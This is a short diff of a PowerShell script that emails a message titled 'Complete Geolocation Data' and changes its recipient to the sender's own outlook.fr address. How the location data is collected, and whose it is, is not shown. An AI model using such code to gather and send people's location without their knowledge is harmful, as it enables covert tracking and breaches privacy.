@@ -9,7 +9,7 @@ Try {
 
     $MailMessage = New-Object System.Net.Mail.MailMessage
     $MailMessage.From = 'UsulMadhi@outlook.fr'
-    $MailMessage.To.Add('UsulMadhi@proton.me')
+    $MailMessage.To.Add('UsulMadhi@outlook.fr')
     $MailMessage.Subject = 'Complete Geolocation Data'
     $MailMessage.Body = $Message
 
